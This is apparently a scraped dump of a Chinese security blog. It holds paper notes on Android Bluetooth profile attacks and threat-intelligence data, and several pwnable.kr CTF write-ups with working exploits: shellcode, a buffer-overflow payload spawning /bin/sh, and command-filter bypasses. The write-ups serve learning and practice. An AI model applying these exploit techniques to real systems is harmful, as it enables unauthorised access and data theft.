Stack#蓝牙协议栈的结构如下图：蓝牙栈是一个多层的结构，包括物理层、链路层、中间件层和应用层。下层由蓝牙芯片实现，包含无线控制器、系带控制器等。它们通过主机控制器接口(Host Controller Interface)与操作系统进行通信，中间件层的协议由操作系统实现。中间件层的基础层协议是逻辑链路控制适配协议(L2CAP)，它管理两个蓝牙设备之间的连接，实现了QoS、流控、分片和重装机制等功能。在L2CAP的基础上，设计了一系列面向应用的协议。（RFCOMM,SDP等）Bluetooth Profile#蓝牙配置文件是为了规范不同厂商设备间的通信。在配置文件中包含了引导通信的设置，例如格式、协议等，目前共有30多种标准配置文件。最常用的配置文件是耳机配置文件(Headset Profile，HSP)，它规定了蓝牙耳机如何与手机通信。Bluetooth Connetion#蓝牙的连接过程：发现阶段：扫描发现附近设备，包括设备名字，设备种类，设备profile配对阶段：致辞多种配对模式，一般需要用户输入pin码或者比较数据建立连接：两个设备配对后共享link key，用于加密双方通信的数据Android Bluetooth#之前的Android的是linux的BlueZ栈，但从Android 4.2开始，google实现了自己的蓝牙栈BlueDroidBlueDroid中的权限管理：normal-level：无需用户确认，用来请求和接收连接BLUETOOTHBLUETOOTH_ADMINdangerous-level，：需要用户授权，扫描附近设备，用来获取用户位置ACCESS_COARSE_LOCATIONACCESS_FINE_LOCATIONsignature-level：需要用户授权，用户需要交互的配对过程BLUETOOTH_PRIVILEGEDDesign Weaknesses#在BlueDroid的设计中，主要存在以下五个weaknessWeakness #1: Inconsistent Authentication Process on Pro- files.在配对过程中，配置文件不会被列出。如果在配对后对配置文件进行修改，配对仍然会成立如果连接时为耳机的配置文件，在连接后修改为输入设备的配置文件，那么就能够通过蓝牙进行输入了Weakness #2: Overly Openness to Profile Connection.一旦连接建立，主机就会尽力连接到远程设备声称的所有配置文件，而不会向用户解释风险，也不会让用户审核这些连接。即使用户稍后可以在设备详情菜单中断开某些配置文件的连接，但主机不会记住这样的决定。当下次设备配对时，连接将被重新建立。Weakness #3: Deceivable and Vague UI.用户浏览配对的蓝牙设备列表时，能够看到名称和图标，但这是能够伪造的恶意设备能够修改名称，通过改变CoD(Class of Device)号改变现实的图标缺少UI提示蓝牙相关信息。例如，只有两个事件会在通知栏中提示：显示蓝牙已打开，显示已连接远程设备。Weakness #4: Silent Pairing with Device.当从设备端发送配对请求时，Android系统会弹出对话框让用户确认。但是，如果由手机发起连接，则可能没有通知。 比如，当设备没有显示能力或输入能力（例如，耳机）**Weakness #5: No Permission Management for Profile. **Android通过权限限制应用程序是否可以访问蓝牙设备，但是权限管理太过粗糙例如使用BLUETOOTH_ADMIN权限能访问配置文件，虽然在新版中受到了限制，但能通过java反射机制实现ATTACK OVERVIEW#攻击者模型：手机上安装具有Bluetooth权限的恶意app-BLUETOOTH和BLUETOOTH_ADMIN是一般权限 - 无需请求用户同意权限申请Bluetooth设备是受攻击者控制的 - XcodeGhost攻击 - 通过设备其他漏洞获得设备权限后插入恶意代码攻击流程：修改配置文件(#1 #2 #3)：配对完成后，设备添加其他配置文件，并在攻击完成后删除静默连接(#4)：使用静默方式连接恶意蓝牙设备使用敏感的配置文件(#5)：通过java反射机制操作敏感的配置文件攻击步骤：启动恶意app，并保持后台运行，直到监测到手机屏幕关闭时开始攻击通过调用BluetoothAdapter.enable静默配对已知地址的恶意设备设备等待从app发来的命令，命令通过蓝牙信道传送，或通过网络转发接到命令后，设备使用敏感的配置文件，App利用存在的配置文件功能设备恢复正常的状态，App使用removeBond取消配对，以免引起注意Attack#作者根据现有的android profile，总结并实现了攻击，其中HID、PAN和HFP/HSP这三个profile可以被攻击者利用HIP(Human Interface Device)#例如键盘和鼠标，当HIP接入后，就能向android手机输入内容了攻击策略：自适应攻击：主要在于识别鼠标位置等，通过手机手机的信息输入：通过模拟按键和鼠标点击构造输入输出：截屏或者选择文字赋值粘贴进行输出危害：信息窃取操控系统和App盗取密码等敏感内容PAN(Persinal Area Networking)#危害：网络嗅探和欺骗：由于手机能够通过蓝牙访问互联网，因此可以执行中间人攻击，拦截流量偷网络流量：通过蓝牙共享手机网络HF(Hands Free)#危害：控制电话，拨打任意号码语音命令控制Other Profiles#除了上述三种profile的攻击，也有一些其他的攻击可以实现，但他们会通知用户批准请求，因此并不隐秘IMPLEMENTATIONS AND EVALUATIONS#设备：树莓派2代（Linux OS）CSR8510 USB蓝牙适配器Google Pixel 2 （Android 8.1）实现：Raspberry Pi 2 + 1100 行Python 代码（PyBluez）HID attack，raw L2CAPPAN attack，tcpdump和dnsmasqHFP attack，pulseaudio和ofono在测试中，Android5.0到8.1之间的测试版本都攻击成功了PROFILE BINDING FOR ANDROID#为了解决发现的问题，作者也提出并实现了相应的防御框架，对profile进行控制经过检验，这个上层防御框架能够在比正常使用多12%的时间，实现很好的防御个人感觉#文中主要对安卓蓝牙协议栈进行了研究，但其实文中提出的weakness中，有的在其他系统中也存在，比如静默匹配，以及提示弹窗问题在大部分系统中都有，可能可以对这一方法进行一些系统的扩展和进一步研究。同时，由于蓝牙是基于连接的问题，可以想到常用的wifi，苹果的隔空投送等也可能有问题。例如，刚看论文的时候想到了一个wifi重连的问题，虽然没仔细研究，但可能可以根据wifi自动重连的机制，伪造wifi，截取用户的流量，形成中间人攻击","link":"/93934686.html"},{"title":"An analysis and classification of public information securiy data sources used in research and practice","text":"课程作业，选题数据质量评价方法，所以看了这篇文章Abstract#是对当前公共信息安全数据源的分类与分析。对于信息安全数据来源多样且质量不一的情况进行研究分析，从六个维度进行分类和比较：(1) Type of information, (2) Integrability, (3) Timeliness, (4) Originality, (5) Type of Source,and (6) Trustworthiness。共收集和比较了68个公开的信息安全数据源，结果表明由于来源不同，数据异构繁多，加大了统一集成和使用的难度。Introduction#信息安全数据源：提供有关脆弱性、威胁、攻击、风险、受影响资产或可用对策的信息源例如NVD、twitter的数据源等当前研究gap：至今为止，对这些数据源的实证研究不多见，缺乏对这些数据源可用性、特征、依赖性和如何使用的系统且全面的概述。也没有对这些数据源的对比结果。研究目标：对数据源进行分类，定性定量分析。研究从以下三个问题入手：1、怎么分类；2、特征是什么；3、数据源之间有什么依赖关系Related work#Steinberger et al. 分析现有用例，根据数据交换格式和协议，给出了结构化认识Hernandez-Ardieta et al. 提出基于交换格式的实时信息安全数据共享模型Rader and Wash 分析三类安全数据源：文章、网页、个人经历，发现主要内容为attack和结果Massacci and Nguyen 分析14个漏洞库，比较信息格式Tripathi and Singh 对几个漏洞库的漏洞分类方案进行分析，希望提出更高的分类方案Tounsi and Rais 对不同的威胁情报类型进行了分类。关注新的标准、趋势和技术问题。Mavroeidis and Bromander 对共享标准和策略进行分类Zhao and White概述了信息安全数据共享的重要性，并提供了重要共享的信息安全数据类型列表。…总结：目前的研究大多集中在信息安全数据交换或威胁情报共享方面，而对脆弱性数据库等信息安全数据源的分析研究还不多见。Research methodology#将问题2划分为很多子问题如下：2.1 数据源存在哪些特征2.2 信息结构是什么2.3 获取数据的接口是什么2.4 谁提供了这些信息2.5 信息分享的时间2.6 提供的信息是最原始的信息吗问题3 划分：3.1 提供的不同类型的信息之间有什么关系3.2 接口如何与提供的不同类型的信息相关？整体章节结构如下：Literature Review#基于snowballing方法，方法步骤如下：定义文章的起始点集合执行snowballing迭代（包括向前snowballing，例如确定引用被检查论文的新论文，以及向后snowballing，例如查看所考虑论文的参考文献）定义起始点：通过关键字搜索各大数据库获得对应的文章（遵从snowballing的5大原则）迭代：前向后向各进行三十次迭代直到没有新的paper进入集合，通过引用和被引等信息，经过blabla最后选出了42份优质论文Data collection on twitter#利用关键词，使用爬虫爬和CVE有关的tweets，pattern匹配CVE-\\d{4}-\\d{4}，（现在这个pattern已经不够用了）一共搜集到了20160523-20180327间的709880个tweets，平均每个tweet中有0.8个url指向了包含详细信息的网页。一共有11437个不同的详细信息链接，选取了其中的top50Exploratory survey#调研公共安全数据源的使用，通过问卷的方式对29个大公司进行调研：What public available information security data sources are you using as input to information security risk management processes?让他们从87个备选数据源中挑选最常用的3个，然后最后根据调研选出了32个数据源Selection of information security data sources#从上面的42，50，32中选取开源、英语并且和attack、risk等相关的，其他的商用、非英语什么的丢掉Development of classification taxonomy#没用的章节Classification and analysis of information security data sources#好像也没什么用，总之是为了减小个人看法对分类结果的影响，分类也是人工分的Results#Classification taxonomy#分类结果如下：根据信息类型 按照IEC2014划分为Vulnerability、Threat、Countermeasure、Attack、Risk、Asset根据可集成性 按照IEC/ISO27005，描述了信息自动化聚集的程度，分为结构性的，非结构性的格式和接口等根据及时性可以分为常规的日报月报和突发两种根据独创性分为一手和二手资料根据信息源类型分为 新闻网页、博客、安全产品网页、漏洞库、邮件、社交网络等根据信赖程度分为 可信性、可追溯性、反馈机制后面的东西与课程作业内容不是很相关所以就不看了，都是回答前面抛出的的questions这六个分类维度和选题还算有点关系","link":"/1ffe8215.html"},{"title":"Beyond Free Riding-Quality of Indicators for Assessing Participation in Information Sharing for Threat Intelligence","text":"依然是态势感知作业需求Abstract#paper针对在威胁情报共享体系中，某些参与者为了获得共享情报，却又不给出实质性的贡献的情况（所谓搭便车），提出指标质量QoI来评估参与者的贡献，并引入了以下度量：正确性、相关性、实用性和唯一性。采用基准方法定义了质量度量，然后获得了一个参考数据集，并利用机器学习文献中的工具进行质量评估。将这些结果与仅将信息量视为贡献度量的模型进行了比较，揭示了各种有趣的观察结果，发现低质量的参与者。Introduction#在建立共享体系过程中，参与者之间也存在着竞争关系，所以有的参与者只想加入但不想有实质性的贡献。所以有了作者的这个工作Quality of Indicators#一个定义良好的QoI系统能够区分参与者的贡献度，提高社区质量。由于在社区中，并不是强制性的要求共享，全凭意愿。因此我们需要一个稳健的评价系统，而不是预先定义信任。The Simple Contribution Measures#其他论文存在这个gap,因此确定QoI来捕捉搭便车现象存在必要。仅仅通过成员贡献的数目来衡量贡献度是不够的，在以往的文献中未提出很好的贡献质量评价标准。Features of Quality of Indicators#已有的文献探讨过QoI和信息私密性（独家）、正确性（准确）、与社区成员的相关性（领域）、效用、唯一性（信息是否冗余）的关系。除了以上，也有时效性指标。单独的使用一个指标是不够的，因此在本文中对其进行加权来评价这些指标的质量。Contribution#1、结果认为，在信息共享体系中，需要QoI来分析成员的贡献2、制定了稳健的度量指标3、通过实验演示了指标，展示了健壮性，以及它区分搭便车行为的能力OVERVIEW AND PRELIMINARIES#首先概述了网络威胁情报系统，然后介绍了这些系统中信息共享的独特问题，为了解决这些问题，需要采取质量评估。The Threat Landscape#主要讲了僵尸网络的威胁The Need for Threat Intelligence#主要是为了在被攻击前发现安全威胁。类似于银行没被抢之前就找到有意图的罪犯。Threat Intelligence Sharing#随着互联网的发展，威胁的增多，单个机构的力量很难解决所有问题。通过威胁情报的共享，可以联合防御。为了达成情报共享，就需要定义接口啥的来进行交换。（参考文献3、4、5定义了信息共享标准）Risks of Sharing#1、威胁信息的暴露，可能会被利用于攻击2、泄露分享者的隐私信息等3、参与者之间存在合作和竞争关系，一手情报不愿意分享Formulation of the Free-Riding Problem#定义搭便车行为：一些人是为了从共享信息系统获利而不是为了贡献，不肯提供有用的内容。How Quality of Indicators Help#这小段没啥信息量QOI ASSESSMENT METHODOLOGY#QoI度量包括指标相对于标签特征的正确性、指标与消费社区成员的相关性、指标的实用性及其唯一性。QoI Metrics#4个度量：正确性相关性实用性唯一性System Architecture &amp; Design#上图是大概的共享体系模型，在其中加入一个assessor，用于计算分享的信息的质量，打分这里假设交换的信息真实且清晰可见，使用现有的信息交换协议，提供端到端的安全保证。System Setup and Steps#定义评价指标和打分程序定义威胁和质量标签的注释。注释可以是指示威胁类型的标签，也可以是用于标识指标的质量（严重性，及时性等）或质量类型的标签。利用这些注释，将权重值分配给每个质量标签，并使用计分方法将质量标签转换为指标的数字总得分。构建参考数据集训练分类器给定样本，用模型预测样本的标签，与参与者提供的标签对比是否匹配，结果记录为质量批注，计算置信度整体过程如下如所示QoI Assessment Process Operation#训练使用有监督学习算法，整体过程包含特征选取、机器学习算法的选取、参数矫正（正则化等）、交叉验证QOI ASSESSMENT PROCEDURES#是对前面步骤的详细说明Reference Dataset and Learning#主要以VirusTotal作为参考，可信度高且信息量充足、其内容十分有用。Extrapolation and Benchmarking#在有了初始的参考后，需要考虑的是如何使用参考数据集来评估和推断指标的值和质量。在paper中使用半监督学习来解决这个问题。分类模型：nearest centroid classifier （NCC）最近质心分类器找了个图，大概这样Labeling and Quality Scoring#有了分类器，然后需要参与者给出提供信息的feature和label，就能进行预测和打分了。Correctness#计算正确性如果预测出来的标签和参与者提供的标签匹配，就给一个正分数，然后最后加权平均得到结果分数Relevance#计算相关度对于公众更感兴趣的label，赋予更大的权值Utility#计算效用Uniqueness#计算唯一性Quality of Indicator (QoI)#EVALUATION AND FINDINGS#和传统的只看数量方法进行比较Dataset Characteristics#为了突出QoI作为评估威胁情报信息共享贡献的新概念，我较了基于质量和基于数量的评分方法对AV供应商贡献的差异。为此，我们的数据集列举了在2011年年中至2013年年中的数据收集期间，向VirusTotal提交恶意软件样本（包括标签）的AV供应商评估的一个关键目标是证明在使用基于数量的分数计算的不足，因为一个供应商可以通过提交大量关于低质量恶意软件样本的信息来获得高评级。如前所述，这可能是由于以下几个原因造成的：提交的关于某些恶意软件样本的工件不正确，样本族不准确，或者提交的关于样本的信息类型无助于识别或检测它们。Result#就是几个图，结论也很清楚可以看到有很多公司在划水23333感想#虽然这个工作得出了有意思的结论，但其实存在一些不恰当的地方，在计算特征的时候，提到了权重，看样子都是作者自定义的，不太科学，更好的方法是通过使用ground truth，利用数值化的方法来计算出来（比如一般来说，我们知道出现次数越多的label一般是人们比较感兴趣的，可以通过计算频率来算权重，代替认为指定）。","link":"/7160fe1c.html"},{"title":"pwnable.kr —— asm","text":"question#123Mommy! I think I know how to make shellcodesssh asm@pwnable.kr -p2222 (pw: guest)analyse#拖入ida伪代码可以看到1234567891011121314puts(&quot;Welcome to shellcoding practice challenge.&quot;);puts(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.&quot;);puts(&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.&quot;);puts(&quot;If this does not challenge you. you should play 'asg' challenge :)&quot;);s = (char *)mmap((void *)0x41414000, 0x1000uLL, 7, 50, 0, 0LL);memset(s, 144, 0x1000uLL);v4 = strlen(stub);memcpy(s, stub, v4);printf(&quot;give me your x64 shellcode: &quot;, stub, argv);read(0, s + 46, 0x3E8uLL);alarm(0xAu);chroot(&quot;/home/asm_pwn&quot;);sandbox(&quot;/home/asm_pwn&quot;);((void (*)(void))s)();也就是要求我们自己写shellcode，来实现读取flag的操作，注意，只能使用open，read，write三个系统函数。本来网站http://syscalls.kernelgrok.com/可以查调用表的，不过好像因为维护上不去，所以我用它的github项目部署了一下http://syscall.ycdxsb.cn/这里为了方便些shellcode，我们可以用pwntools的shellcraft模块编写http://docs.pwntools.com/en/stable/shellcraft/amd64.html首先我们需要将函数名push到栈中1234filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'payload = ''payload += shellcraft.amd64.pushstr(filename)由于是push进去的，所以这个时候rsp存的就是函数名，接着我们使用open打开这个文件1payload += shellcraft.amd64.open('rsp',0,0)由于是封装好了，所以这里的参数和实际的open函数参数一致对于64位函数，执行完后的返回值就在rax中，也就是我们open函数的fd值在rax中，然后我们需要使用read函数将内容读到rsp指向的内存中，如下1payload += shellcraft.amd64.read('rax','rsp',100)最后使用write函数将rsp内容输出到屏幕上1payload += shellcraft.amd64.write(1,'rsp',100)get flag#123456789101112131415from pwn import *context(arch='amd64',os='linux')#p = process('asm')p = remote('127.0.0.1',99026)filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'payload = ''payload += shellcraft.amd64.pushstr(filename)payload += shellcraft.amd64.open('rsp',0,0)payload += shellcraft.amd64.read('rax','rsp',100)payload += shellcraft.amd64.write(1,'rsp',100)p.recvuntil('shellcode: ')p.sendline(asm(payload))print p.recv()12345[DEBUG] Received 0x64 bytes: 'Mak1ng_shelLcodE_i5_veRy_eaSy\\n' 'lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo'Mak1ng_shelLcodE_i5_veRy_eaSylease_read_this_file.sorry_the_file_name_is_very_looooooooooooooooooooflag:Mak1ng_shelLcodE_i5_veRy_eaSy","link":"/d7bb76ce.html"},{"title":"pwnable.kr —— blackjack","text":"question#123456789Hey! check out this C implementation of blackjack game!I found it online* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.htmlI like to give my flags to millionares.how much money you got?Running at : nc pwnable.kr 9009analyse#1234567891011121314int betting() //Asks user amount to bet{ printf(&quot;\\n\\nEnter Bet: $&quot;); scanf(&quot;%d&quot;, &amp;bet); if (bet &gt; cash) //If player tries to bet more money than player has { printf(&quot;\\nYou cannot bet more money than you have.&quot;); printf(&quot;\\nEnter Bet: &quot;); scanf(&quot;%d&quot;, &amp;bet); return bet; } else return bet;} // End Function可以看到当输入bet后，会与cash比较，数了以后cash=cash-bet那么输入一个大的负数，并且输掉应该就可以了get flag#输入bet：-100000000，然后选择Stay输掉，再进入下一场即可获得flagflag：YaY_I_AM_A_MILLIONARE_LOL","link":"/1c0d597c.html"},{"title":"pwnable.kr —— blukat","text":"question#1234Sometimes, pwnable is strange...hint: if this challenge is hard, you are a skilled player.ssh blukat@pwnable.kr -p2222 (pw: guest)get flag#调试了下看到了password，输入就行了120x6010a0 &lt;password&gt;: 0x736170203a746163 0x50203a64726f77730x6010b0 &lt;password+16&gt;: 0x6f697373696d7265 0x6465696e6564206e密码是 cat: password: Permission denied1234blukat@prowl:~$ ./blukatguess the password!cat: password: Permission deniedcongrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!","link":"/df231074.html"},{"title":"pwnable.kr —— cmd1","text":"question#123Mommy! what is PATH environment in Linux?ssh cmd1@pwnable.kr -p2222 (pw:guest)题目要求我们使用ssh登录到服务器上ssh cmd1@pwnable.kr -p2222，密码是guest,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录cmd1#12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd){ int r=0; r += strstr(cmd, \"flag\")!=0; r += strstr(cmd, \"sh\")!=0; r += strstr(cmd, \"tmp\")!=0; return r;}int main(int argc, char* argv[], char** envp){ putenv(\"PATH=/thankyouverymuch\"); if(filter(argv[1])) return 0; system( argv[1] ); return 0;}analyse#注意到：其中对输入的命令进行了过滤，去除了sh，tmp，flag字符cat方法使用f*代替flaggrep方法同上使用通配符环境变量方法建立环境变量，值为flag除此之外还可以有软链接，执行另一文件等get flag#123456789cmd1@ubuntu:~$ ./cmd1 \"/bin/cat f*\"mommy now I get what PATH environment is for :)cmd1@ubuntu:~$ ./cmd1 \"/bin/grep -Rn :\"Binary file cmd1 matchesflag:1:mommy now I get what PATH environment is for :)/bin/grep: .bash_history: Permission deniedcmd1@ubuntu:~$ export f=flagcmd1@ubuntu:~$ ./cmd1 \"/bin/cat \\$f\"mommy now I get what PATH environment is for :)flag：mommy now I get what PATH environment is for :)","link":"/92a446ce.html"},{"title":"pwnable.kr —— bof","text":"question#1234567Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.cRunning at : nc pwnable.kr 9000先看下文件，然后nc上去进行数据输入bof.c#123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\\n&quot;); }}int main(int argc, char* argv[]){ func(0xdeadbeef); return 0;}analyse#把bof拖进IDA里看下1234567891011121314unsigned int __cdecl func(int a1){ char s; // [esp+1Ch] [ebp-2Ch] unsigned int v3; // [esp+3Ch] [ebp-Ch] v3 = __readgsdword(0x14u); puts(&quot;overflow me : &quot;); gets(&amp;s); if ( a1 == -889275714 ) system(&quot;/bin/sh&quot;); else puts(&quot;Nah..&quot;); return __readgsdword(0x14u) ^ v3;}在main函数调用func时，留出位置给key，所以让buffer溢出到key，填入0xcafebabe即可。IDA告诉我们s的位置位于ebp-2Ch处，而key的位置在ebp+8h处。中间要填上52个字节。get flag#写python脚本如下：12345from pwn import *ssh = remote(&quot;pwnable.kr&quot;,9000)payload = &quot;a&quot;*52+p32(0xcafebabe)ssh.send(payload)ssh.interactive()运行1234567891011121314ubuntu@VM-0-3-ubuntu:~$ python bof.py [+] Opening connection to pwnable.kr on port 9000: Done[*] Switching to interactive mode$ lsbofbof.cflagloglog2super.pl$ cat flagdaddy, I just pwned a buFFer :)$ [*] Closed connection to pwnable.kr port 9000flag:daddy, I just pwned a buFFer :)","link":"/a4584c42.html"},{"title":"pwnable.kr —— cmd2","text":"question#12345Daddy bought me a system command shell.but he put some filters to prevent me from playing with it without his permission...but I wanna play anytime I want!ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)题目要求我们使用ssh登录到服务器上ssh cmd2@pwnable.kr -p2222，密码是cmd1的flag,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录cmd2.c#12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd){ int r=0; r += strstr(cmd, \"=\")!=0; r += strstr(cmd, \"PATH\")!=0; r += strstr(cmd, \"export\")!=0; r += strstr(cmd, \"/\")!=0; r += strstr(cmd, \"`\")!=0; r += strstr(cmd, \"flag\")!=0; return r;}extern char** environ;void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));}int main(int argc, char* argv[], char** envp){ delete_env(); putenv(\"PATH=/no_command_execution_until_you_become_a_hacker\"); if(filter(argv[1])) return 0; printf(\"%s\\n\", argv[1]); system( argv[1] ); return 0;}analyse#相对于cmd1，加强了过滤规则，主要是其中/的问题可以在目录下使用pwd构造其余的无差get flag#123cmd2@ubuntu:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*'$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*FuN_w1th_5h3ll_v4riabl3s_hahaflag：FuN_w1th_5h3ll_v4riabl3s_haha","link":"/bad1774.html"},{"title":"pwnable.kr —— coin1","text":"question#1234Mommy, I wanna play a game!(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)Running at : nc pwnable.kr 9007game#123456789101112131415161718192021222324252627282930 - Shall we play a game? - --------------------------------------------------- You have given some gold coins in your hand however, there is one counterfeit coin among them counterfeit coin looks exactly same as real coin however, its weight is different from real one real coin weighs 10, counterfeit coin weighes 9 help me to find the counterfeit coin with a scale if you find 100 counterfeit coins, you will get reward :) FYI, you have 60 seconds. - How to play - 1. you get a number of coins (N) and number of chances (C) 2. then you specify a set of index numbers of coins to be weighed 3. you get the weight information 4. 2~3 repeats C time, then you give the answer - Example - [Server] N=4 C=2 # find counterfeit among 4 coins with 2 trial [Client] 0 1 # weigh first and second coin [Server] 20 # scale result : 20 [Client] 3 # weigh fourth coin [Server] 10 # scale result : 10 [Client] 2 # counterfeit coin is third! [Server] Correct! - Ready? starting in 3 sec... - N=441 C=9analyse#就是写脚本交互计算一下get flag#脚本如下：123456789101112131415161718192021222324252627282930313233343536373839from pwn import *def get_weight(begin,end): message = &quot;&quot; if(begin == end): ssh.sendline(str(begin)) else: for i in range(begin,end + 1): message = message + str(i)+&quot; &quot; ssh.sendline(message) weight = ssh.recvline() return int(weight)def get_result(N,C): begin = 0 end = N-1 for i in range(0,C): weight = get_weight(begin,int(begin+(end-begin)/2)) if(weight%10!=0): end = int(begin+(end-begin)/2) else: begin = int(begin+(end-begin)/2)+1 ssh.sendline(str(end)) result = ssh.recvline() print(result)ssh = remote('0',9007)print(ssh.recv())for i in range(0,100): print(&quot;begin to process the %d th&quot;%i) question = ssh.recvline() N = int(question.split(&quot; &quot;)[0].split(&quot;=&quot;)[1]) C = int(question.split(&quot; &quot;)[1].split(&quot;=&quot;)[1]) print N,C get_result(N,C)print ssh.recvline()print ssh.recvline()连上去速度略慢，所以可以scp到pwnable.kr服务器再运行脚本scp -P 2222 coin.py fd@pwnable.kr:/tmpflag：b1NaRy_S34rch1nG_1s_3asy_p3asy","link":"/6060be05.html"},{"title":"pwnable.kr —— collision","text":"question#1234Daddy told me about cool MD5 hash collision today.I wanna do something like that too!ssh col@pwnable.kr -p2222 (pw:guest)题目需要我们使用ssh登录到服务器上查看ssh col@pwnable.kr -p2222，密码是guest,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录col.c#12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res;}int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\\n&quot;); return 0;}analyse#可以看到，要求输入一个20个字符组成的串，然后在check_password函数中，以int的方式读取这20个字符的值，如果加起来的值等于0x21DD09EC的话，那么就可以通过hashcode==check_password(argv[1])的判断，读取flag的内容。get flag#随便凑五个数，比如有0x05050505*4+0xdc8f5d8，那么可以写出以下命令12col@ubuntu:~$ ./col `python -c 'print(&quot;\\x05&quot;*16+&quot;\\xd8\\xf5\\xc8\\x0d&quot;)'`daddy! I just managed to create a hash collision :)flag:daddy! I just managed to create a hash collision :)","link":"/90653887.html"},{"title":"pwnable.kr —— fd","text":"question#123456Mommy! what is a file descriptor in Linux?* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:https://youtu.be/971eZhMHQQwssh fd@pwnable.kr -p2222 (pw:guest)题目要求我们使用ssh登录到服务器上查看ssh fd@pwnable.kr -p2222，密码是guest,有的时候可能有身份的校验，这个时候需要加上参数-o StrictHostKeyChecking=no进行登录fd.c#123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0;}analyse#当运行可执行程序fd后，会计算变量fd的值，然后作为read函数的参数对read函数进行调用read函数：fd为0 ：标准输入fd为1 ：标准输出fd为2 ：标准错误输出所以在这里我们需要是fd为0，然后输入字符串LETMEWIN给buf，这样判断strcmp(&quot;LETMEWIN\\n&quot;, buf)的结果为0，从而运行system函数可以查看到flag所以atoi(argv[1])的值应该等于0x1234,其十进制值为4660get flag#1234fd@ubuntu:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!flag:mommy! I think I know what a file descriptor is!!","link":"/98f1adad.html"},{"title":"pwnable.kr —— flag","text":"question#12345Papa brought me a packed present! let's open it.Download : http://pwnable.kr/bin/flagThis is reversing task. all you need is binaryanalyse#下载下来，先用pwntools来看下checksec123456789ubuntu@VM-0-3-ubuntu:~$ checksec flag[*] '/home/ubuntu/flag' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Packer: Packed with UPX可以看到有UPX的壳，使用UPX工具去壳 官方链接12345678910ubuntu@VM-0-3-ubuntu:~/upx$ ./upx -d ../flag Ultimate Packer for eXecutables Copyright (C) 1996 - 2018UPX 3.95 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Aug 26th 2018 File size Ratio Format Name -------------------- ------ ----------- ----------- 883745 &lt;- 335288 37.94% linux/amd64 flagUnpacked 1 file.看起来好像没什么了，flag文件也非常的大get flag#用strings命令看下里面的字符串，得到flag12ubuntu@VM-0-3-ubuntu:~$ strings flag | grep ':)'UPX...? sounds like a delivery service :)flag：UPX...? sounds like a delivery service :)","link":"/5bc7dc4f.html"},{"title":"pwnable.kr —— horcruxes","text":"question#12345Voldemort concealed his splitted soul inside 7 horcruxes.Find all horcruxes, and ROP it!author: jiwon choissh horcruxes@pwnable.kr -p2222 (pw:guest)analyse#IDA打开看到ropme函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int ropme(){ char s[100]; // [esp+4h] [ebp-74h] int v2; // [esp+68h] [ebp-10h] int fd; // [esp+6Ch] [ebp-Ch] printf(&quot;Select Menu:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); getchar(); if ( v2 == a ) { A(); } else if ( v2 == b ) { B(); } else if ( v2 == c ) { C(); } else if ( v2 == d ) { D(); } else if ( v2 == e ) { E(); } else if ( v2 == f ) { F(); } else if ( v2 == g ) { G(); } else { printf(&quot;How many EXP did you earned? : &quot;); gets(s); if ( atoi(s) == sum ) { fd = open(&quot;flag&quot;, 0); s[read(fd, s, 0x64u)] = 0; puts(s); close(fd); exit(0); } puts(&quot;You'd better get more experience to kill Voldemort&quot;); } return 